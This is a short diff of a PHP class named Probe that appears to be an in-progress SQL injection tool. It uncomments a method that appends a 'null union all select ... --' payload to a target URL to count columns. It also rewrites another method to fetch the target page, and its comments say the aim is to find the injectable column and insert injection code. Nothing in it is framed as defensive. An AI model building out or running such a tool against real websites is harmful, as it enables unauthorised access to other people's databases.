@@ -37,7 +37,7 @@ class Probe
  	 * @param string $url
  	 * @return string
  	 */
-	/*
+
 	public function getColumnNum()
 	{
 		$column = 1;
@@ -57,7 +57,7 @@ class Probe
 
 		return $shortUrl . "null union all select " . $getRange . "--";
 	}
-*/
+
 	/**
  	 * Returns column number that is most vulnerable to injection 
  	 *
@@ -70,15 +70,9 @@ class Probe
 
 		$contents = file_get_contents($test);
 
-		$occurence = "get first occurence to inject code into to";
+		return $contents;
 
-		if (strpos($contents, $occurence))
-		{
-			return 'found';
-			//replace $occurence with selected injection into URL
-		}
-		
-		return 'not found';
+		//get first occuring number and replace with sql injection code
 	}
 }
 
